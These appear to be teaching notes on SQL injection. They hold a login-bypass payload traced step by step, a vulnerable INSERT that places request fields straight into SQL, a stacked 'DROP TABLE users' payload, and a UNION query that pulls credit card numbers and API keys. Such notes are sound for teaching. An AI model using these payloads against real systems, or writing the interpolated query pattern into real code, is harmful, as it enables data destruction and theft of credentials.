SELECT id, username, is_admin, email 
    FROM users 
    WHERE username = 'admin' 
    AND password = 'admin123'



SELECT id, username, is_admin, email 
    FROM users 
   


 WHERE username = 'admin' OR ('1'='1' AND password = 'asjflasdljfl;asjd;lf')

WHERE username = 'admin' OR (true AND false)

WHERE username = 'admin' OR false

WHERE username = 'admin' 


Query 2:
INSERT INTO blog_posts (id, title, content) VALUES (${id}, '${req.body.title}', '${req.body.content}')

INSERT INTO blog_posts (id, title, content) VALUES (567, 'Add another post', 'test'); 
DROP TABLE users;
 --')




SELECT username, email 
FROM users 
WHERE username = 'admin' 
    UNION 
SELECT credit_card, api_key 
FROM users 
WHERE '1'='1';